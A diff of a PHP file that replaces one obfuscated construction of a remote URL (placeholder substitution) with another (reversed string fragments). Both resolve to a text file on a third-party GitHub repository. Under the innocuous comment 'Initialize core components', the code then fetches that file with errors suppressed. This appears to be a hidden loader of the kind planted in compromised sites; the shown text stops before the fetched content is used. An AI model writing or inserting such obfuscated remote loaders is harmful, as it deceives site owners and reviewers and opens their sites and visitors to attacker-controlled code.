@@ -5,22 +5,8 @@
 */
 
 // Initialize core components
-$template = "XXX1://XXX2.XXX3XXX4.XXX5/XXX6/XXX7/XXX8/XXX9/XXX10/XXX11.XXX12";
-$replacements = [
-    'XXX1' => 'https',
-    'XXX2' => 'raw',
-    'XXX3' => 'githubusercontent',
-    'XXX4' => 'content',
-    'XXX5' => 'com',
-    'XXX6' => 'seobela',
-    'XXX7' => 'bela',
-    'XXX8' => 'refs',
-    'XXX9' => 'heads',
-    'XXX10' => 'main',
-    'XXX11' => 'index',
-    'XXX12' => 'txt'
-];
-$full_url = str_replace(array_keys($replacements), array_values($replacements), $template);
+$parts = array('txt.xedni/', 'niam/sdaeh/', 'sfer/aleb/', 'aleboes/', 'moc.tnetnocresubuhtig.war/', '://sptth');
+$full_url = strrev(implode('', $parts));
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
